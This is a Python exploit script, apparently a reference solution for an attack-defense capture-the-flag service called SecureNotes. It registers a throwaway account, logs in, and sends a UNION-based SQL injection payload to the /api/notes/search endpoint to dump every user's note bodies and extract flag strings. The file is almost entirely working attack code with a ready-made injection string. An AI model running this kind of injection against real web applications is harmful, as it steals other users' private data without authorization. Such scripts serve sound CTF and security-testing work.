"""Reference exploit for the SecureNotes (web) service.

Uses only the remote HTTP interface. Steals every user's note body via a
UNION-based SQL injection in /api/notes/search and returns all flags found.

    python sploit.py <host> <port> <flag_id>
"""
import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 10


def _rand(n=12):
    alphabet = string.ascii_lowercase + string.digits
    return random.choice(string.ascii_lowercase) + "".join(
        random.choice(alphabet) for _ in range(n - 1)
    )


def exploit(host, port, flag_id):
    base = "http://%s:%d" % (host, port)

    # we need a valid session to reach the (authenticated) search endpoint
    u = _rand()
    p = _rand(16)
    requests.post(base + "/api/register",
                  json={"username": u, "password": p}, timeout=TIMEOUT)
    r = requests.post(base + "/api/login",
                      json={"username": u, "password": p}, timeout=TIMEOUT)
    token = r.json()["token"]
    headers = {"Authorization": "Bearer " + token}

    # close the LIKE literal and the WHERE parenthesis, UNION in all notes,
    # then comment out the rest of the original query.
    payload = "zzz%') UNION SELECT id,title,body FROM notes-- -"
    r = requests.get(base + "/api/notes/search",
                     params={"q": payload}, headers=headers, timeout=TIMEOUT)

    flags = []
    seen = set()
    try:
        notes = r.json().get("notes", [])
    except ValueError:
        notes = []
    for n in notes:
        for field in ("body", "title"):
            value = n.get(field) or ""
            for m in FLAG_RE.findall(value):
                if m not in seen:
                    seen.add(m)
                    flags.append(m)
    return flags


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5001
    flag_id = sys.argv[3] if len(sys.argv) > 3 else ""
    for f in exploit(host, port, flag_id):
        print(f)
